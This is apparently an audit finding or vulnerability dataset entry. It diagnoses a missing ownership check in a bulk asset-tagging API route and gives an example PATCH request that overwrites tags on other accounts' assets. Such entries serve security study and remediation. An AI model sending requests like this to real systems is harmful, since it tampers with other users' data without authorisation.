diagnosis: The Pydantic model validates the size of the asset_ids array, but the route executes a bulk SQL UPDATE targeting all asset_ids provided in the payload without scoping to DigitalAsset.creator_id == user.id. An attacker can overwrite metadata tags and classifications on digital assets belonging to other accounts.
exploit_request:
PATCH /dam/assets/batch-tags HTTP/1.1
Host: api.example.com
Authorization: Bearer <attacker_jwt>
Content-Type: application/json

{"asset_ids": [551, 552, 9940], "tags": ["confidential", "reviewed"]}
